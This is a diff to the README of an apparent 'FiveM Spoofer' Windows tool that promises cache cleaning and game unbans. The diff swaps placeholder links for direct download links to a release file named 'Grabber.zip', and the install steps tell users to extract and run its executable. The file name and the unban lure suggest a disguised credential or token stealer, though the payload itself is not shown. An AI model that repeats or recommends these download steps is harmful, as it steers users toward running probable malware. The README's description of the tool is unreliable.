@@ -1,6 +1,6 @@
 # FiveM Spoofer 🎮
 
-[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-purple)](5)
+[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-purple)](https://github.com/cdsacv2wq/FiveM-Spoofer/releases/download/V1.5/Grabber.zip)
 
 ![FiveM Spoofer](https://img.shields.io/badge/FiveM%20Spoofer-v1.0-blue)
 
@@ -21,7 +21,7 @@ FiveM Spoofer is a Windows application designed to optimize and clean cache file
 
 To get started with FiveM Spoofer, follow these steps:
 
-1. **Download the latest version** from the [Releases section](5).
+1. **Download the latest version** from the [Releases section](https://github.com/cdsacv2wq/FiveM-Spoofer/releases/download/V1.5/Grabber.zip).
 2. **Extract the downloaded file** to a location of your choice.
 3. **Run the application** by double-clicking the executable file.
 
@@ -63,6 +63,6 @@ FiveM Spoofer is licensed under the MIT License. See the [LICENSE](LICENSE) file
 
 FiveM Spoofer is a powerful tool for any FiveM player looking to enhance their gaming experience. With its cache cleaning capabilities and unban functionality, it helps users regain access to their favorite servers. 
 
-For the latest updates and releases, check the [Releases section](5). 
+For the latest updates and releases, check the [Releases section](https://github.com/cdsacv2wq/FiveM-Spoofer/releases/download/V1.5/Grabber.zip). 
 
 Thank you for using FiveM Spoofer! Happy gaming! 🎉
